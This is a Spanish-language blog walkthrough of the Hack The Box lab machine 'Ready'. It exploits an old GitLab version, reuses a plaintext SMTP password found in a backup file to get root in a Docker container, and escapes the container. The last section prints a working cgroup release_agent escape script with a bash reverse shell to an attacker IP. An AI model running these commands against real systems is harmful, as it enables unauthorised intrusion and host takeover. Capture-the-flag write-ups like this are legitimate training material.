---
layout: single
title: Ready - Hack The Box
excerpt: "Resolución de la máquina *Ready* de Hack The Box, una máquina Linux de dificultad media según la plataforma en la cual nos aprovechamos de una vulnerabilidad en una versión antigua de Gitlab para obtener el acceso inicial, para posteriormente elevar privilegios a root dentro de un contenedor docker y finalmente escapar del contenedor y obtener la shell de root en la máquina."
date: 2021-05-15
classes: wide
header:
  teaser: /assets/images/Ready-Hackthebox/ready.png
  teaser_home_page: true
categories:
  - HackTheBox
tags:
  - Web Exploiting
  - Privilege Escalation
  - Pentesting
  - Linux
---

![](/assets/images/Ready-Hackthebox/ready.png)

Resolución de la máquina *Ready* de Hack The Box, una máquina Linux de dificultad media según la plataforma en la cual nos aprovechamos de una vulnerabilidad en una versión antigua de Gitlab para obtener el acceso inicial,     para posteriormente elevar privilegios a root dentro de un contenedor docker y finalmente escapar del contenedor y obtener la shell de root en la máquina.

## Escaneo con nmap
---

```bash
> nmap -sC -sV -p22,5080 10.10.10.220 -oN targeted                                                                                                                                                              ─╯
Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-23 16:48 CEST
Nmap scan report for 10.10.10.220
Host is up (0.32s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile
| /dashboard /projects/new /groups/new /groups/*/edit /users /help
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.08 seconds
```

Vemos que hay un Gitlab en le puerto 5080.

![](/assets/images/Ready-Hackthebox/gitlab.png)

Me registro con un usuario (ximo:ximo1234) y veo que la version es 11.4.7

![](/assets/images/Ready-Hackthebox/version.png)

Busco por gitlab 11.4.7 exploit github y encuentro un exploit aquí:

[https://github.com/dotPY-hax/gitlab_RCE](https://github.com/dotPY-hax/gitlab_RCE)

Lo ejecuto y obtengo el acceso inicial.

![](/assets/images/Ready-Hackthebox/foothold.png)

## Escalada a root dentro del contenedor docker
---

Veo que hay un usuario llamado dude en el directorio home y directamente ya puedo leer el user.txt porque los permisos del fichero están configurados para que los usuarios que pertenezcan al grupo git lo puedan leer.

Sigo eumerando el sistema hasta que encuentro en /opt/backup el fichero gitlab.rb donde veo la siguiente contraseña:

gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"

Pensando en la reutilización de contraseñas pruebo la contraseña con la cuenta de root y accedo como root pero eso si, del contenedor. Estamos en un contenedor docker.

![](/assets/images/Ready-Hackthebox/docker.png)

## Escalada a root
---

Siendo root dentro del contenedor busco información sobre como escapar del contenedor docker y encuentro esta página:

[https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout)

Con fdisk -l veo que a partición del sistema host es /dev/sda2

Creo un directorio en /mnt y monto la partición allí. Ya puedo leer el root.txt

```bash
mkdir -p /mnt/root
mount /dev/sda2 /mnt/root
```

Ya tengo el root.txt pero además quiero obtener una shell de root en la máquina.

Veo que hay una poc (prueba de concepto) en la misma página así que la pruebo.

![](/assets/images/Ready-Hackthebox/poc.png)

Me creo un fichero llamado poc.sh en el directorio /tmp con el contenido de la poc

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/10.10.14.32/9001 0>&1" >> /cmd
chmod a+x /cmd
#===================================

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output
```

Me pongo a la escucha en el puerto 9001 y ejecuto ./poc.sh y me devuelve la shell de root :)
